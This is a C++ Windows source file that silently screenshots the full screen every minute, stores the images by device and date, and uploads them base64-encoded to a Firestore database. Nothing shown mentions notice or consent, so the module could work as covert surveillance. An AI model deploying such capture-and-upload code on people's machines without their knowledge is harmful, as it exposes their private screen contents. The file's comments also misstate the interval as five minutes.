#include "ScreenCapture.h"
#include "Utils.h"
#include "DBcommunication.h"
#include "JsonLog.h"
#include <windows.h>
#include <gdiplus.h>
#include <fstream>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <condition_variable>
#include <sstream>
#include <iomanip>

#pragma comment(lib, "gdiplus.lib")

// Base64 encoding table
static const char base64_chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

// GDI+ initialization
static ULONG_PTR g_gdiplusToken = 0;
static bool g_gdiplusInitialized = false;

// Periodic screenshot thread management
static std::thread g_screenshotThread;
static std::atomic<bool> g_shouldStopScreenshots(false);
static std::mutex g_screenshotMutex;
static std::condition_variable g_screenshotCV;

// Initialize GDI+ (call once at startup)
void InitializeGDIPlus() {
    if (!g_gdiplusInitialized) {
        Gdiplus::GdiplusStartupInput gdiplusStartupInput;
        Gdiplus::GdiplusStartup(&g_gdiplusToken, &gdiplusStartupInput, NULL);
        g_gdiplusInitialized = true;
    }
}

// Shutdown GDI+ (call once at cleanup)
void ShutdownGDIPlus() {
    if (g_gdiplusInitialized) {
        Gdiplus::GdiplusShutdown(g_gdiplusToken);
        g_gdiplusInitialized = false;
    }
}

// Get encoder CLSID for a given format
int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num = 0;
    UINT size = 0;

    Gdiplus::GetImageEncodersSize(&num, &size);
    if (size == 0) return -1;

    Gdiplus::ImageCodecInfo* pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL) return -1;

    Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

// Convert binary data to Base64
std::string Base64Encode(const unsigned char* data, size_t length) {
    std::string encoded;
    int i = 0;
    int j = 0;
    unsigned char char_array_3[3];
    unsigned char char_array_4[4];

    while (length--) {
        char_array_3[i++] = *(data++);
        if (i == 3) {
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;

            for (i = 0; i < 4; i++)
                encoded += base64_chars[char_array_4[i]];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 3; j++)
            char_array_3[j] = '\0';

        char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
        char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
        char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);

        for (j = 0; j < i + 1; j++)
            encoded += base64_chars[char_array_4[j]];

        while (i++ < 3)
            encoded += '=';
    }

    return encoded;
}

// Convert screenshot file to Base64
std::string ConvertScreenshotToBase64(const std::string& filePath) {
    try {
        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
        if (!file) return "";

        std::streamsize size = file.tellg();
        file.seekg(0, std::ios::beg);

        std::vector<unsigned char> buffer(size);
        if (!file.read((char*)buffer.data(), size)) {
            return "";
        }

        return Base64Encode(buffer.data(), buffer.size());
    }
    catch (const std::exception& e) {
        return "";
    }
}

// Capture screenshot and save as PNG
bool CaptureScreenshot(const std::string& deviceGuid, std::time_t timestamp) {
    try {
        InitializeGDIPlus();

        // Get the screen dimensions
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);

        // Calculate compressed dimensions (50% of original)
        int compressedWidth = screenWidth / 2;
        int compressedHeight = screenHeight / 2;

        // Get current date for folder organization
        std::string currentDate = getCurrentDate();
        
        // Create screenshot folder structure: {deviceGuid}/{date}/screenshots
        std::string screenshotFolder = deviceGuid + "\\" + currentDate + "\\screenshots";
        createNestedFolders(screenshotFolder);

        // Create filename with timestamp
        std::ostringstream oss;
        oss << screenshotFolder << "\\" << timestamp << ".png";
        std::string filePath = oss.str();

        // Capture the screen
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMemory = CreateCompatibleDC(hdcScreen);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
        HBITMAP hOldBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmap);

        BitBlt(hdcMemory, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);

        // Convert to GDI+ Bitmap
        Gdiplus::Bitmap originalBitmap(hBitmap, NULL);
        
        // Create a compressed version
        Gdiplus::Bitmap compressedBitmap(compressedWidth, compressedHeight, PixelFormat24bppRGB);
        Gdiplus::Graphics graphics(&compressedBitmap);
        
        // Set high-quality downscaling
        graphics.SetInterpolationMode(Gdiplus::InterpolationModeHighQualityBicubic);
        graphics.SetSmoothingMode(Gdiplus::SmoothingModeHighQuality);
        graphics.SetPixelOffsetMode(Gdiplus::PixelOffsetModeHighQuality);
        
        // Draw the original bitmap scaled down
        graphics.DrawImage(&originalBitmap, 0, 0, compressedWidth, compressedHeight);

        // Get PNG encoder
        CLSID pngClsid;
        if (GetEncoderClsid(L"image/png", &pngClsid) == -1) {
            // Cleanup
            SelectObject(hdcMemory, hOldBitmap);
            DeleteObject(hBitmap);
            DeleteDC(hdcMemory);
            ReleaseDC(NULL, hdcScreen);
            return false;
        }

        // Save the compressed image
        std::wstring wFilePath(filePath.begin(), filePath.end());
        Gdiplus::Status status = compressedBitmap.Save(wFilePath.c_str(), &pngClsid, NULL);

        // Cleanup
        SelectObject(hdcMemory, hOldBitmap);
        DeleteObject(hBitmap);
        DeleteDC(hdcMemory);
        ReleaseDC(NULL, hdcScreen);

        if (status != Gdiplus::Ok) {
            return false;
        }

        // Convert to Base64 and upload to Firestore
        std::string base64Image = ConvertScreenshotToBase64(filePath);
        if (!base64Image.empty()) {
            std::string collectionPath = "records/" + deviceGuid + "/screenshots";
            
            // Create a map with timestamp as key and base64 as value
            firebase::firestore::MapFieldValue screenshotMap;
            screenshotMap[std::to_string(timestamp)] = firebase::firestore::FieldValue::String(base64Image);
            
            // Upload to Firestore (merge with existing document for this date)
            bool uploadSuccess = updateDocument(collectionPath, currentDate, screenshotMap);
            
            // Return true if file was saved locally (upload failure is non-critical)
            // This ensures the function reports success even if Firebase upload fails
            return true;
        }

        return true;
    }
    catch (const std::exception& e) {
        return false;
    }
}

// Count screenshots for a specific date
int CountScreenshotsForDate(const std::string& deviceGuid, const std::string& date) {
    try {
        std::string screenshotFolder = deviceGuid + "\\" + date + "\\screenshots";
        std::string searchPath = screenshotFolder + "\\*.png";
        
        int count = 0;
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    count++;
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
        
        return count;
    }
    catch (const std::exception& e) {
        return 0;
    }
}

// Get all screenshot files for a date
std::vector<std::string> GetScreenshotFilesForDate(const std::string& deviceGuid, const std::string& date) {
    std::vector<std::string> files;
    try {
        std::string screenshotFolder = deviceGuid + "\\" + date + "\\screenshots";
        std::string searchPath = screenshotFolder + "\\*.png";
        
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
        
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
                    std::string filename = fd.cFileName;
                    files.push_back(screenshotFolder + "\\" + filename);
                }
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
    catch (const std::exception& e) {
        // Return empty vector
    }
    return files;
}

// Periodic screenshot worker function
void PeriodicScreenshotWorker() {
    const std::chrono::minutes SCREENSHOT_INTERVAL(1); // 5 minutes
    
    while (!g_shouldStopScreenshots.load()) {
        // Use condition_variable for efficient waiting
        {
            std::unique_lock<std::mutex> lock(g_screenshotMutex);
            // Wait for 5 minutes or until stop is requested
            if (g_screenshotCV.wait_for(lock, SCREENSHOT_INTERVAL,
                []() { return g_shouldStopScreenshots.load(); })) {
                // Stop was requested
                break;
            }
        }
        
        if (g_shouldStopScreenshots.load()) {
            break;
        }
        
        // Take screenshot
        try {
            std::string deviceGuid = getDeviceGUID();
            std::time_t timestamp = getCurrentTimestamp();
            CaptureScreenshot(deviceGuid, timestamp);
        }
        catch (const std::exception& e) {
            // Handle errors gracefully - don't crash the thread
        }
    }
}

// Start the periodic screenshot thread
bool StartPeriodicScreenshots() {
    try {
        std::lock_guard<std::mutex> lock(g_screenshotMutex);
        
        if (g_screenshotThread.joinable()) {
            // Thread is already running
            return true;
        }
        
        g_shouldStopScreenshots.store(false);
        g_screenshotThread = std::thread(PeriodicScreenshotWorker);
        
        return true;
    }
    catch (const std::exception& e) {
        return false;
    }
}

// Stop the periodic screenshot thread
void StopPeriodicScreenshots() {
    try {
        {
            std::lock_guard<std::mutex> lock(g_screenshotMutex);
            g_shouldStopScreenshots.store(true);
        }
        
        // Notify the condition variable to wake up the waiting thread
        g_screenshotCV.notify_one();
        
        if (g_screenshotThread.joinable()) {
            g_screenshotThread.join();
        }
        
        // Shutdown GDI+ when stopping screenshots
        ShutdownGDIPlus();
    }
    catch (const std::exception& e) {
        // Handle error gracefully
    }
}
